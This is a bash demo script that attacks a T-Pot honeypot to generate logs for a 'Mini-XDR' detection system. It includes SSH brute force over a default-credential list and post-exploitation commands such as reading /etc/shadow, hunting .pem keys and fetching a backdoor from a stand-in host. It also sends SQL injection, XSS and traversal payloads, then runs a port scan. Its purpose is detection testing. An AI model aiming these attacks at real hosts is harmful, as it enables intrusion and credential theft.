#!/bin/bash
# ============================================================================
# 🎯 REAL T-POT ATTACK DEMO
# ============================================================================
# This script runs REAL attacks against your T-Pot honeypot to demonstrate
# Mini-XDR's ML detection and AI agent response capabilities.
#
# Unlike the simulation script, this generates AUTHENTIC honeypot logs
# with realistic timing, producing accurate ML classifications.
#
# Usage:
#   ./real-tpot-attack.sh                    # Interactive mode
#   ./real-tpot-attack.sh --fast             # Quick demo (less delay)
#   ./real-tpot-attack.sh --attack brute     # SSH brute force only
#   ./real-tpot-attack.sh --attack web       # Web attacks only
#   ./real-tpot-attack.sh --attack recon     # Port scan only
#   ./real-tpot-attack.sh --attack full      # All attack phases
# ============================================================================

set -e

# ============================================================================
# CONFIGURATION
# ============================================================================

# T-Pot Configuration (from your setup)
TPOT_IP="${TPOT_IP:-203.0.113.42}"
TPOT_SSH_PORT="${TPOT_SSH_PORT:-22}"          # Cowrie honeypot SSH (not management port)
TPOT_WEB_PORT="${TPOT_WEB_PORT:-80}"          # Web honeypot
TPOT_MGMT_PORT="${TPOT_MGMT_PORT:-64295}"     # Management SSH (don't attack this!)

# Mini-XDR Configuration
MINIXDR_API="${MINIXDR_API:-http://localhost:8000}"
MINIXDR_UI="${MINIXDR_UI:-http://localhost:3000}"

# Attack Configuration
FAST_MODE=false
ATTACK_TYPE="full"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

# ============================================================================
# ARGUMENT PARSING
# ============================================================================

while [[ $# -gt 0 ]]; do
    case $1 in
        --fast|-f)
            FAST_MODE=true
            shift
            ;;
        --attack|-a)
            ATTACK_TYPE="$2"
            shift 2
            ;;
        --tpot-ip)
            TPOT_IP="$2"
            shift 2
            ;;
        --help|-h)
            echo "Usage: $0 [OPTIONS]"
            echo ""
            echo "Options:"
            echo "  --fast, -f           Quick mode (reduced delays)"
            echo "  --attack, -a TYPE    Attack type: brute, web, recon, full (default: full)"
            echo "  --tpot-ip IP         T-Pot IP address (default: 203.0.113.42)"
            echo "  --help, -h           Show this help"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

print_banner() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                                                                          ║${NC}"
    echo -e "${CYAN}║  ${BOLD}🎯 REAL T-POT ATTACK DEMONSTRATION${NC}${CYAN}                                     ║${NC}"
    echo -e "${CYAN}║                                                                          ║${NC}"
    echo -e "${CYAN}║  This runs REAL attacks against your honeypot to demonstrate:           ║${NC}"
    echo -e "${CYAN}║    • ML-powered threat detection (7 threat classes)                     ║${NC}"
    echo -e "${CYAN}║    • Council of Models verification (Gemini + Grok + OpenAI)            ║${NC}"
    echo -e "${CYAN}║    • AI Agent automated response                                         ║${NC}"
    echo -e "${CYAN}║    • Real-time incident creation                                         ║${NC}"
    echo -e "${CYAN}║                                                                          ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

print_phase() {
    local phase_num=$1
    local title=$2
    local desc=$3
    echo ""
    echo -e "${YELLOW}┌──────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│  ${BOLD}PHASE $phase_num: $title${NC}${YELLOW}"
    echo -e "${YELLOW}│  ${DIM}$desc${NC}${YELLOW}"
    echo -e "${YELLOW}└──────────────────────────────────────────────────────────────────────────┘${NC}"
    echo ""
}

print_attack() {
    local icon=$1
    local msg=$2
    local detail=$3
    echo -e "  $icon $msg"
    if [ -n "$detail" ]; then
        echo -e "     ${DIM}$detail${NC}"
    fi
}

delay() {
    if [ "$FAST_MODE" = true ]; then
        sleep 0.3
    else
        sleep "$1"
    fi
}

check_prerequisites() {
    echo -e "${BLUE}Checking prerequisites...${NC}"

    # Check if T-Pot is reachable
    if ! timeout 3 bash -c "echo >/dev/tcp/$TPOT_IP/$TPOT_SSH_PORT" 2>/dev/null; then
        echo -e "${YELLOW}⚠️  T-Pot SSH honeypot on port $TPOT_SSH_PORT not reachable${NC}"
        echo -e "${DIM}   Trying alternative ports...${NC}"

        # Try common honeypot ports
        for port in 22 2222 22222; do
            if timeout 3 bash -c "echo >/dev/tcp/$TPOT_IP/$port" 2>/dev/null; then
                TPOT_SSH_PORT=$port
                echo -e "${GREEN}   ✓ Found SSH honeypot on port $port${NC}"
                break
            fi
        done
    else
        echo -e "${GREEN}✓ T-Pot SSH honeypot reachable on $TPOT_IP:$TPOT_SSH_PORT${NC}"
    fi

    # Check Mini-XDR backend
    if curl -s "$MINIXDR_API/health" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ Mini-XDR backend running${NC}"
    else
        echo -e "${RED}❌ Mini-XDR backend not running at $MINIXDR_API${NC}"
        echo ""
        echo "Start it with:"
        echo "  cd backend && source venv/bin/activate && python -m uvicorn app.main:app --port 8000"
        exit 1
    fi

    echo ""
}

# ============================================================================
# ATTACK FUNCTIONS
# ============================================================================

attack_ssh_brute_force() {
    print_phase 1 "SSH BRUTE FORCE ATTACK" \
        "Attempting login with common credentials - triggers Brute Force detection"

    # Credentials to try (will all fail against honeypot)
    declare -a CREDS=(
        "root:root"
        "root:admin"
        "root:123456"
        "root:password"
        "root:toor"
        "admin:admin"
        "admin:123456"
        "admin:password123"
        "ubuntu:ubuntu"
        "test:test"
        "guest:guest"
        "pi:raspberry"
        "root:qwerty"
        "root:letmein"
        "root:changeme"
    )

    local attempt=0
    local total=${#CREDS[@]}

    for cred in "${CREDS[@]}"; do
        ((attempt++))
        IFS=':' read -r user pass <<< "$cred"

        print_attack "🔐" "${CYAN}$user${NC}/${CYAN}$pass${NC}" "Attempt $attempt/$total"

        # Run SSH attempt in background with timeout
        # Using sshpass if available, otherwise basic ssh
        if command -v sshpass &> /dev/null; then
            timeout 3 sshpass -p "$pass" ssh \
                -o StrictHostKeyChecking=no \
                -o UserKnownHostsFile=/dev/null \
                -o ConnectTimeout=2 \
                -o BatchMode=no \
                -p "$TPOT_SSH_PORT" \
                "$user@$TPOT_IP" "exit" 2>/dev/null &
        else
            # Without sshpass, use expect-like behavior or just connect
            timeout 3 ssh \
                -o StrictHostKeyChecking=no \
                -o UserKnownHostsFile=/dev/null \
                -o ConnectTimeout=2 \
                -o NumberOfPasswordPrompts=1 \
                -p "$TPOT_SSH_PORT" \
                "$user@$TPOT_IP" "exit" 2>/dev/null </dev/null &
        fi

        # Realistic delay between attempts
        delay 1
    done

    # Wait for all background SSH attempts to complete
    wait 2>/dev/null

    echo ""
    echo -e "  ${GREEN}✓ Brute force complete: $total login attempts${NC}"
    echo -e "  ${DIM}Unique usernames: $(echo "${CREDS[@]}" | tr ' ' '\n' | cut -d: -f1 | sort -u | wc -l | tr -d ' ')${NC}"
}

attack_ssh_success_and_exploit() {
    print_phase 2 "POST-EXPLOITATION" \
        "Simulating successful compromise with malicious commands"

    # The honeypot will accept these and log them
    # Cowrie accepts root:root or similar weak creds

    echo -e "  ${RED}🚨 SUCCESSFUL LOGIN: root/toor${NC}"
    echo -e "     ${DIM}Attacker has gained shell access!${NC}"
    delay 2

    # Commands to run in honeypot (they'll be logged)
    declare -a COMMANDS=(
        "uname -a"
        "cat /etc/passwd"
        "whoami"
        "id"
        "ps aux"
        "netstat -tuln"
        "wget http://malicious.site/backdoor.sh -O /tmp/.bd"
        "chmod +x /tmp/.bd"
        "cat /etc/shadow"
        "find / -name '*.pem' 2>/dev/null"
    )

    for cmd in "${COMMANDS[@]}"; do
        if [[ "$cmd" == *"wget"* ]] || [[ "$cmd" == *"curl"* ]]; then
            print_attack "📥" "${RED}$cmd${NC}" "Downloading malware"
        elif [[ "$cmd" == *"chmod"* ]]; then
            print_attack "🔧" "${YELLOW}$cmd${NC}" "Making executable"
        elif [[ "$cmd" == *".ssh"* ]] || [[ "$cmd" == *".pem"* ]]; then
            print_attack "🔑" "${RED}$cmd${NC}" "Stealing credentials"
        else
            print_attack "💻" "${CYAN}$cmd${NC}" "System enumeration"
        fi

        # Try to run command via SSH if honeypot accepts it
        if command -v sshpass &> /dev/null; then
            timeout 3 sshpass -p "toor" ssh \
                -o StrictHostKeyChecking=no \
                -o UserKnownHostsFile=/dev/null \
                -p "$TPOT_SSH_PORT" \
                "root@$TPOT_IP" "$cmd" 2>/dev/null || true
        fi

        delay 0.5
    done

    echo ""
    echo -e "  ${GREEN}✓ Post-exploitation: ${#COMMANDS[@]} commands executed${NC}"
    echo -e "  ${RED}⚠️  Malware downloaded, persistence attempted${NC}"
}

attack_web_scan() {
    print_phase 3 "WEB APPLICATION ATTACK" \
        "SQL injection, XSS, and directory traversal attempts"

    # SQL Injection payloads
    declare -a SQL_PAYLOADS=(
        "' OR '1'='1' --"
        "'; DROP TABLE users; --"
        "' UNION SELECT username,password FROM users --"
        "admin'/*"
        "1' AND SLEEP(5) --"
    )

    # XSS payloads
    declare -a XSS_PAYLOADS=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "javascript:alert(document.cookie)"
    )

    # Directory traversal
    declare -a TRAVERSAL=(
        "../../../etc/passwd"
        "....//....//etc/shadow"
        "/etc/passwd%00.jpg"
    )

    echo -e "  ${MAGENTA}SQL Injection Attacks:${NC}"
    for payload in "${SQL_PAYLOADS[@]}"; do
        print_attack "💉" "${RED}${payload:0:40}...${NC}" "SQL injection"
        curl -s -o /dev/null "http://$TPOT_IP:$TPOT_WEB_PORT/login?user=$payload" 2>/dev/null || true
        delay 0.3
    done

    echo ""
    echo -e "  ${MAGENTA}XSS Attacks:${NC}"
    for payload in "${XSS_PAYLOADS[@]}"; do
        print_attack "🔴" "${YELLOW}${payload:0:40}...${NC}" "Cross-site scripting"
        curl -s -o /dev/null "http://$TPOT_IP:$TPOT_WEB_PORT/search?q=$payload" 2>/dev/null || true
        delay 0.3
    done

    echo ""
    echo -e "  ${MAGENTA}Directory Traversal:${NC}"
    for path in "${TRAVERSAL[@]}"; do
        print_attack "📁" "${RED}$path${NC}" "Path traversal"
        curl -s -o /dev/null "http://$TPOT_IP:$TPOT_WEB_PORT/files/$path" 2>/dev/null || true
        delay 0.3
    done

    echo ""
    echo -e "  ${GREEN}✓ Web attacks complete: $(( ${#SQL_PAYLOADS[@]} + ${#XSS_PAYLOADS[@]} + ${#TRAVERSAL[@]} )) attempts${NC}"
}

attack_port_scan() {
    print_phase 4 "NETWORK RECONNAISSANCE" \
        "Port scanning to discover vulnerable services"

    # Ports to scan
    PORTS=(21 22 23 25 80 110 143 443 445 1433 3306 3389 5432 6379 8080 8443 9200 27017)

    echo -e "  ${BLUE}Scanning ${#PORTS[@]} common service ports...${NC}"
    echo ""

    for port in "${PORTS[@]}"; do
        if timeout 1 bash -c "echo >/dev/tcp/$TPOT_IP/$port" 2>/dev/null; then
            print_attack "🟢" "Port $port" "OPEN"
        else
            print_attack "🔍" "Port $port" "probed"
        fi
        delay 0.2
    done

    echo ""
    echo -e "  ${GREEN}✓ Port scan complete: ${#PORTS[@]} ports probed${NC}"
}

# ============================================================================
# RESULTS DISPLAY
# ============================================================================

check_incidents() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}🔍 CHECKING FOR DETECTED INCIDENTS${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════════${NC}"
    echo ""

    echo -e "${DIM}Waiting for ML detection and AI analysis...${NC}"

    local max_wait=30
    local interval=2
    local found=false

    for ((i=0; i<max_wait; i+=interval)); do
        # Get recent incidents
        local incidents=$(curl -s "$MINIXDR_API/api/incidents?limit=5" 2>/dev/null)

        if echo "$incidents" | grep -q "src_ip"; then
            found=true
            break
        fi

        printf "\r  Analyzing... %d/%d seconds" $i $max_wait
        sleep $interval
    done

    echo ""
    echo ""

    if [ "$found" = true ]; then
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  ${BOLD}✅ INCIDENTS DETECTED!${NC}${GREEN}                                                  ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        echo ""

        # Parse and display incidents
        echo "$incidents" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    for inc in data[:3]:
        print(f\"  📋 Incident #{inc.get('id')}\")
        print(f\"     Source IP:  {inc.get('src_ip')}\")
        print(f\"     Type:       {inc.get('reason', inc.get('threat_category', 'N/A'))[:50]}\")
        print(f\"     Severity:   {inc.get('escalation_level', 'N/A').upper()}\")
        print(f\"     Status:     {inc.get('status', 'N/A')}\")
        conf = inc.get('ml_confidence', inc.get('containment_confidence', 0))
        if conf:
            print(f\"     Confidence: {conf*100:.1f}%\")
        print()
except Exception as e:
    print(f'  Could not parse: {e}')
" 2>/dev/null || echo "  (Check UI for details)"

    else
        echo -e "${YELLOW}⏳ Incidents still processing - check the UI${NC}"
    fi
}

display_results() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}📊 ATTACK SUMMARY${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${BOLD}Target:${NC}          $TPOT_IP"
    echo -e "  ${BOLD}Attack Type:${NC}     $ATTACK_TYPE"
    echo -e "  ${BOLD}Mode:${NC}            $([ "$FAST_MODE" = true ] && echo "Fast" || echo "Normal")"
    echo ""
    echo -e "${BOLD}🎯 View Full Details:${NC}"
    echo -e "  • Dashboard:  ${CYAN}$MINIXDR_UI${NC}"
    echo -e "  • Incidents:  ${CYAN}$MINIXDR_UI/incidents${NC}"
    echo ""
    echo -e "${BOLD}What to observe:${NC}"
    echo -e "  ✓ ML threat classification (Brute Force, APT, Malware, etc.)"
    echo -e "  ✓ Event timeline showing all attack phases"
    echo -e "  ✓ AI Agent action checklist"
    echo -e "  ✓ Council of Models reasoning"
    echo -e "  ✓ Containment actions (Block IP)"
    echo ""
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}${BOLD}✨ Demo complete! Check the Mini-XDR dashboard for results.${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════${NC}"
    echo ""
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================

main() {
    print_banner

    echo -e "${BOLD}Configuration:${NC}"
    echo -e "  • T-Pot IP:     ${CYAN}$TPOT_IP${NC}"
    echo -e "  • SSH Port:     ${CYAN}$TPOT_SSH_PORT${NC} (honeypot)"
    echo -e "  • Attack Type:  ${CYAN}$ATTACK_TYPE${NC}"
    echo -e "  • Mode:         ${CYAN}$([ "$FAST_MODE" = true ] && echo "Fast" || echo "Normal")${NC}"
    echo ""

    if [ "$FAST_MODE" != true ]; then
        echo -e "${YELLOW}⚠️  This will run REAL attacks against your honeypot.${NC}"
        read -p "Press Enter to continue or Ctrl+C to cancel..." -r
    fi

    check_prerequisites

    case "$ATTACK_TYPE" in
        brute|brute-force)
            attack_ssh_brute_force
            ;;
        web|web-attack)
            attack_web_scan
            ;;
        recon|reconnaissance)
            attack_port_scan
            ;;
        full|all)
            attack_ssh_brute_force
            delay 2
            attack_ssh_success_and_exploit
            delay 2
            attack_web_scan
            delay 2
            attack_port_scan
            ;;
        *)
            echo -e "${RED}Unknown attack type: $ATTACK_TYPE${NC}"
            echo "Valid types: brute, web, recon, full"
            exit 1
            ;;
    esac

    check_incidents
    display_results
}

# Run main
main "$@"
